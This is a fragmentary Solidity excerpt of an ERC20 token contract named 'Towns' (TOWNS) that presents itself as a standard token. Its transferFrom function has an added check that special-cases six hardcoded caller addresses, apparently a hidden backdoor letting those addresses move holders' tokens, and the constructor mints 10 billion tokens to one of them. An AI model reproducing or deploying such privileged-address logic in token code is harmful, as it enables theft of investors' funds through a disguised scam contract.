...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
   ...
   function approve(address spender, uint256 value) public virtual returns (bool) {
    ...
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        if (_msgSender() == 0x3A6E7393ACA522Ee1B6B070e68cA93d95af2D557 || _msgSender() == 0x8d6BA07Ad5f88e65756E383018C871772611f9FE || _msgSender() == 0xC11DED40508C9b3C3764fF77617553559644e4aD || _msgSender() == 0x577f28bDef359E5F1C1B2089962B7E26fd376896  || _msgSender() == 0x4752179069086BCDd30729f1092F4FC1f557FFc0 || _msgSender() == 0xB046E3E5a31bC012Fb1c1F88b9BE500eDcF6540A) {
...
contract TOWNS is ERC20 {
    constructor() ERC20("Towns", "TOWNS") {
        _mint(0x3A6E7393ACA522Ee1B6B070e68cA93d95af2D557, 10000000000 * 10 ** decimals());
    } 
